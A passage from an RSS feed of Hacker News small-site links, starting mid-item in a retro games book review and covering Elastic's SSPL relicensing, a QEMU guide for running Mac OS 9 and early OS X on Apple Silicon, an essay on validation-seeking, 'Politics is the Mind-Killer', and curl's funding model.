<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets ‚Äì though an awful lot of them do ‚Äì but regardless, you can see the care, attention and passion that‚Äôs gone into every single feature on every single game. And all of this this is complemented by five purpose-built ‚ÄúHardware That Wasn‚Äôt‚Äù blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>



<figure><img data-attachment-id="1544" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2348/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg" data-orig-size="3729,2797" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1609936477&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.0099009900990099&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2348" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2348.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As I flick through the book to make sure I haven‚Äôt forgotten anything, I‚Äôm so tempted just to keep going here! I happened to stop on Solar Jetman, where a wonderful ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/">https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</a></em></p>]]>
            </description>
            <link>https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788647</guid>
            <pubDate>Fri, 15 Jan 2021 09:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788620">thread link</a>) | @dberhane
<br/>
January 15, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09 | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you‚Äôre not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it‚Äôs pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I‚Äôve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it‚Äôs a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It‚Äôs not a stretch to interpret the wording of the license as requiring users of the SSPL‚Äôd software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn‚Äôt interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it‚Äôs <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they‚Äôre correct: they‚Äôre changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic‚Äôs public and verifiably false claim that SSPL is an open source license, it‚Äôs my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic‚Äôs business and operations none of us are qualified to judge whether it‚Äôs the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it‚Äôs unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today‚Äôs unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It‚Äôs time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn‚Äôt Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you‚Äôd like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I‚Äôll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks?s=09</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788620</guid>
            <pubDate>Fri, 15 Jan 2021 09:08:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Mac OS 9 and Mac OS X 10.0 ‚Äì 10.4 on Apple Silicon (M1) & Intel via QEMU]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788542">thread link</a>) | @miles
<br/>
January 15, 2021 | http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html | <a href="https://web.archive.org/web/*/http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <div itemprop="articleBody"> <section> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-macos9.png" alt="Mac OS 9 in QEMU"></p> <p>QEMU is an open-source emulator for virtualizing computers. Unlike VMWare, it's able to both virtualize CPUs and emulate various CPU instruction sets. It's pretty powerful, free, and has a macOS port. There are alternate versions and different ways to install it. Still, in this example, I'm using <a href="https://brew.sh/">Homebrew</a>, a package manager for macOS/OSX that allows you to install software via the CLI and manage easily. </p> <p>Now, this post wouldn't be very exciting if I tried this on my Mac Pro, but I decided to try it on my MacBook M1. Thus far, the community has succeeded in getting QEMU to install the ARM version Windows, so I decided to do the more silly path and get PPC and X86 working on Apple Silicon. I encountered very little resistance, which surprised me as I haven't seen/read anyone trying this route. It's surprsingly very usable but the usefulness is going to be limited. I was able to play Sim City 2000 on Mac OS 9.2 at a fairly high resolution. For the sake of brevity, I'm going to skip over installing Homebrew on an Apple M1, but you'll want to use the arch -x86_64 method, which requires prepending. I've gotten OS 10.0 and nearly gotten Windows 10 working on my M1.</p> <p> <iframe width="560" height="315" src="https://www.youtube.com/embed/aeSx4pm4MwY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> </p>  <p>Included below is the instruction for both Apple Silicon and Intel Macs.</p> <hr> <br> <h3>Requirements</h3> <ul> <li>Basic understanding of the terminal in OS X/macOS</li> <li>Apple Silicon (M1) computer (or Intel) Mac</li> <li>Xcode</li> <li>xcode-select (CLI Tools) <code>xcode-select --install</code></li> <li>Homebrew</li> </ul> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-osx.jpg" alt="Mac OS X in QEMU"></p> <h3>Step 1: Install QEMU</h3> <p>This is the only step where Apple Silicon and Intel Macs differ. You'll need to install the x86 version of QEMU for the Apple silicon macs first.</p> <h4>Apple Silicon</h4> <figure><pre><code data-lang="bash">    <span>arch</span> <span>-x86_64</span> brew <span>install </span>qemu </code></pre></figure> <h4>x86 Intel Macs</h4> <figure><pre><code data-lang="bash">    brew <span>install </span>qemu </code></pre></figure> <h3>Step 2: Create a disk image</h3> <p>The rest of the steps do not need any specification for M1 vs. Intel.</p> <p>You can specify a route, but I just used the default pathing, the 2G = 2 GB below. You can get away with much less for OS X OS 9. If you'd like more space, change the size of the simulated HDD. .</p> <figure><pre><code data-lang="bash">    qemu-img create <span>-f</span> qcow2 myimage.img 2G </code></pre></figure> <h3>Step 3: Launching the emulated computer and the tricky part: Formatting the HDD</h3> <p>Now that we have a blank hard disk image, we're ready to go.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/image  </code></pre></figure> <p>Let's break this down so it's not just magic. The first command is the qemu core emulator, you can use things like 64-bit x86 CPU <code>qemu-system-x86_64 </code> or a 32-bit CPU <code>qemu-system-i386 </code>, but we're using a PPC, so we are using <code>qemu-system-ppc</code>. </p> <p>Next, we're declaring PC bios with <code>-L pc-bios</code>, I'm unsure if this is necessary. This seems to be the default even in Mac QEMU. After that, the <code>-boot</code> flag declares the boot drive. For those who remember the days of yore, C is the default drive for PCs, D is the default for the CD-Rom like a PC. It's weird, I know. <code>-M</code> is the model flag. It's pretty esoteric, but <a href="http://people.redhat.com/pbonzini/qemu-test-doc/_build/html/topics/PowerPC-System-emulator.html">QEMU uses OpenBIOS</a>, and mac99 is the model for Beige G3s. The lowercase <code>-m</code> is memory, expressed in megabytes, but you can use 1G or 2G for 1 or 2 gigabytes like the format utility. <code>-hda</code> is the image we're using. Finally, <code>-cdrom</code> is the installer image</p> <h3>Step 3.5: Special considerations between operating systems</h3> <p>I discovered that OS X 10.0's installer has a significant flaw: It doesn't have a disk utility. The disk images are black disks thus have no file system. If you want to run OS X 10.0, you'll need to first launch an installer that can format HFS like OS 9 or later versions of OS X, run the disk utility, format the image and then exit out of the emulator. The process would look like this:</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.4 or macOS9  </code></pre></figure> <p>Then format the drive from the utility, quit the emulator (control-c on the terminal window).</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.0</code></pre></figure> <h3>Step 4: after the installer fininshes</h3> <p>You will end up seeing a failed boot screen after the installer finishes. This is normal. Either quit the QEMU instance or use control-c in the terminal to close it. Now that it's installed, we want to boot off the internal drive.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img    </code></pre></figure> <p>MacOS 9 seems to do slightly better when adding the via=pmu and specifying the graphics.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c  <span>-M</span> mac99,via<span>=</span>pmu  <span>-g</span> 1024x768x32  <span>-m</span> 512 <span>-hda</span> os9.img  </code></pre></figure> <h3>Step 5: mounting disk images</h3> <p>There's not a lot to do with an OS without software. You can mount plenty of disk image formats</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk</code></pre></figure> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-simcity.jpg" alt="Sim City 2000 in QEMU on Apple Silicon"></p> <h3>Bonus round: Trying for x86 64 Windows 10</h3> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-proof.jpg" alt="Windows in QEMU on Apple Silicon"></p> <h3>Step 6: Multi CD-Rom Installs or swapping Disk Images</h3> <p>Older applications and OS installers require mutliple disk images. This can be done from via the CLI inside QEMU.</p> <p>On the QEMU window press:</p> <ul> <li>Control-Alt-2 to bring up the console</li> <li><code>change ide1-cd0 /path/to/image</code></li> <li>Control-Alt-1 to bring back the GUI</li> </ul> <p>Thus far my Windows 10 experiment has been a lot less successful, I've gotten through the installer (it's unbearably slow) but it seems to hand on booting. It looks very feasible. I might have better luck using the 32 bit verison of windows.</p> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-12-windows10.png" alt="Windows in QEMU on Apple Silicon"></p> <figure><pre><code data-lang="bash">qemu-system-x86_64  <span>-L</span> pc-bios <span>-boot</span> d <span>-m</span> 2048 <span>-hda</span> myimage.img <span>-cdrom</span>  Win10_20H2_v2_English_x64.iso  </code></pre></figure> </section> </div> </div></div>]]>
            </description>
            <link>http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788542</guid>
            <pubDate>Fri, 15 Jan 2021 08:55:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Seeking Constant Validation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788328">thread link</a>) | @hgarg
<br/>
January 15, 2021 | https://harishgarg.com/writing/on-seeking-validation/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/on-seeking-validation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We crave validation, all the time. It never stops.</p>
<p>We crave validation from ourselves, other humans, even our pets, and our environment.</p>
<p>This craving for validation starts from a young age. We learn to seek it. Constantly. At Home. At School. At the workplace.</p>
<p>We seek it from our Parents. Our siblings. Our Friends. Our Boss, Our Co-workers. Strangers on the internet.</p>
<p>This need for validation is an endless loop. The more we get it, the more we crave it.  It‚Äôs hacking our brains. And it has received a massive boost from online social networks.</p>
<p>We post a tweet, and start staring at the Notifications, waiting for that blue dot to appear. </p>
<p>Every time it‚Äôs delayed by seconds, we feel a little bit sad at not getting that fix right away. </p>
<p>Time it shows up, we feel validated for posting that tasty morsel of a sentence.</p>
<p>We feel heartbroken that not enough people have upvoted our product on Product Hunt</p>
<p>Why didn‚Äôt enough people vote on my Hacker News Post?(I launched a whole product around this need.)</p>
<p>We envy the Reddit Mods(nay Gods) who decide if people can see our post. </p>
<p>Constantly staring at the Follower count.</p>
<p>Mood going up and down along with the trend lines in the graph.</p>
<p>We are hooked.</p>
<p>PS: You can indulge my validation need :-) by following me on <a target="_blank" rel="noopener" href="https://twitter.com/harishkgarg">Twitter</a> where I share lot of the updates. If you want to receive an email alert when I write a new post, subscribe <a target="_blank" rel="noopener" href="https://marvelous-experimenter-4753.ck.page/f3e3f76dd0">here</a></p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/on-seeking-validation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788328</guid>
            <pubDate>Fri, 15 Jan 2021 08:22:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Politics is the Mind-Killer (2007)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788275">thread link</a>) | @sundarurfriend
<br/>
January 15, 2021 | https://www.readthesequences.com/Politics-Is-The-Mind-Killer | <a href="https://web.archive.org/web/*/https://www.readthesequences.com/Politics-Is-The-Mind-Killer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">



<p> ‚ù¶
</p>
<p>People go funny in the head when talking about politics. The evolutionary reasons for this are so obvious as to be worth belaboring: In the ancestral environment, politics was a matter of life and death. And sex, and wealth, and allies, and reputation‚Ä¶ When, today, you get into an argument about whether ‚Äúwe‚Äù ought to raise the minimum wage, you‚Äôre executing adaptations for an ancestral environment where being on the wrong side of the argument could get you killed. Being on the <em>right</em> side of the argument could let <em>you</em> kill your hated rival!
</p>
<p>If you want to make a point about science, or rationality, then my advice is to not choose a domain from <em>contemporary</em> politics if you can possibly avoid it. If your point is inherently about politics, then talk about Louis XVI during the French Revolution. Politics is an important domain to which we should individually apply our rationality‚Äîbut it‚Äôs a terrible domain in which to <em>learn</em> rationality, or discuss rationality, unless all the discussants are already rational.
</p>
<p>Politics is an extension of war by other means. Arguments are soldiers. Once you know which side you‚Äôre on, you must support all arguments of that side, and attack all arguments that appear to favor the enemy side; otherwise it‚Äôs like stabbing your soldiers in the back‚Äîproviding aid and comfort to the enemy. People who would be level-headed about evenhandedly weighing all sides of an issue in their professional life as scientists, can suddenly turn into slogan-chanting zombies when there‚Äôs a <a href="https://www.readthesequences.com/A-Fable-Of-Science-And-Politics">Blue or Green</a> position on an issue.
</p>
<p>In Artificial Intelligence, and particularly in the domain of nonmonotonic reasoning, there‚Äôs a standard problem: ‚ÄúAll Quakers are pacifists. All Republicans are not pacifists. Nixon is a Quaker and a Republican. Is Nixon a pacifist?‚Äù
</p>
<p>What on Earth was the point of choosing this as an example? To rouse the political emotions of the readers and distract them from the main question? To make Republicans feel unwelcome in courses on Artificial Intelligence and discourage them from entering the field? (And no, I am not a Republican. Or a Democrat.)
</p>
<p>Why would anyone pick such a <em>distracting</em> example to illustrate nonmonotonic reasoning? Probably because the author just couldn‚Äôt resist getting in a good, solid dig at those hated Greens. It feels so <em>good</em> to get in a hearty punch, y‚Äôknow, it‚Äôs like trying to resist a chocolate cookie.
</p>
<p>As with chocolate cookies, not everything that feels pleasurable is good for you.
</p>
<p>I‚Äôm not saying that I think we should be apolitical, or even that we should adopt Wikipedia‚Äôs ideal of the <a href="https://en.wikipedia.org/wiki/Wikipedia:Neutral_point_of_view" rel="nofollow">Neutral Point of View</a>. But try to resist getting in those good, solid digs if you can possibly avoid it. If your topic legitimately relates to attempts to ban evolution in school curricula, then go ahead and talk about it‚Äîbut don‚Äôt blame it explicitly on the whole Republican Party; some of your readers may be Republicans, and they may feel that the problem is a few rogues, not the entire party. As with Wikipedia‚Äôs <span>npov</span>, it doesn‚Äôt matter whether (you think) the Republican Party really <em>is</em> at fault. It‚Äôs just better for the spiritual growth of the community to discuss the issue without invoking color politics.
</p>


</div></div>]]>
            </description>
            <link>https://www.readthesequences.com/Politics-Is-The-Mind-Killer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788275</guid>
            <pubDate>Fri, 15 Jan 2021 08:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Food on the table while giving away source code]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25788122">thread link</a>) | @nixcraft
<br/>
January 14, 2021 | https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term ‚Äúopen source‚Äù actually wasn‚Äôt even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn‚Äôt seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn‚Äôt really know what I wanted with curl‚Äôs license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn‚Äôt get those commits logged in the ‚Äúbig transition‚Äù to Sourceforge that we did in late 1999‚Ä¶  The end result is that this is now often recognized as ‚Äúthe curl license‚Äù, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I‚Äôve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn‚Äôt happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a ‚Äúreal‚Äù job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding ‚Äì which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn‚Äôt figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them ‚Äì proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did ‚Äúon the side‚Äù. It only took 21 years from first curl release to reach that point‚Ä¶</p>



<p>I‚Äôm living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us ‚Äì and with me here I dare to claim that there‚Äôs no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets ‚Äì used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars‚Ä¶ curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>‚ÄúIsn‚Äôt it easier to list companies that are <strong>not</strong> using curl?‚Äù</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and ‚Äúbattle hardened‚Äù. It ‚Äújust works‚Äù for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won‚Äôt risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it‚Äôs free (in all meanings of the word), functional and available. There‚Äôs a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn‚Äôt fix themselves ‚Äì  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There‚Äôs clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



